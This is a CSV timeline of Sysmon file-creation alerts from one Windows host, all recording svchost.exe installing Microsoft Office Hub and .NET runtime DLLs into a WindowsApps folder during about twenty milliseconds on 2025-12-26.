"2025-12-26 11:29:12.045 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174960,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.AppNotifications.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.042 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.044","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.045 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174961,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.Apps.TraceLogging.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.044 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.044","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.045 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174962,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.BadgeNotifications.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.044 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.044","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.050 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174963,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.Management.Deployment.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.044 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.044","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.050 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174964,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.Media.Capture.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.046 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.046","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.050 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174965,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.PushNotifications.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.046 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.046","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.050 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174966,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.SDK.NET.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.046 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.046","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.051 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174967,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.Security.AccessControl.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.048 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.048","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.051 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174968,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.Storage.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.048 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.048","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.051 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174969,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.System.Power.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.048 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.048","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.051 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174970,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.System.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.050 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.050","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.051 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174971,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.Widgets.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.050 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.050","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.052 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174972,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.WindowsAppRuntime.Bootstrap.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.050 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.050","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.052 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174973,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.WindowsAppRuntime.Bootstrap.Net.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.050 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.050","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.057 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174974,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.WinUI.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.052 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.052","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.057 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174975,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\minizip.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.052 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.052","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.058 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174976,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\ModelContextProtocol.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.052 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.052","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.058 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174977,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\ModelContextProtocol.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.054 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.054","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.058 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174978,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\MultiModal.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.054 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.054","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.059 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174979,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\MultiModalCSharp.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.054 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.054","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.059 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174980,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\NAudio.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.054 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.054","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.059 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174981,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\NAudio.WinMM.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.056 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.056","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.059 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174982,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\nethost.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.056 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.056","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.059 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174983,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Newtonsoft.Json.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.056 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.056","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.059 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174984,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\nh.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.056 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.058","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.059 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174985,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\OpenTelemetry.Api.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.058 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.058","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.062 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174986,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\OpenTelemetry.Api.ProviderBuilderExtensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.058 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.058","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.062 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174987,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\OpenTelemetry.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.058 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.058","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.062 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174988,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\OpenTelemetry.Exporter.OneCollector.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.060 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.060","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.062 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174989,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Polly.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.060 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.060","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.063 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174990,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Polly.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.060 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.060","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.063 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174991,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Polly.Extensions.Http.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.062 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.062","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.065 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174992,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\clretwrc.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.062 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.062","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.065 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174993,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\clrgc.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.064 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.064","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.066 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174994,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\clrjit.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.064 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.064","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.067 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174995,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\coreclr.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.064 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.066","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.068 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174996,"Rule: EXE ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\createdump.exe ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.066 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.066","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.068 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174997,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\hostpolicy.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.067 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.067","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.068 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174998,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\Microsoft.CSharp.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.067 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.067","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
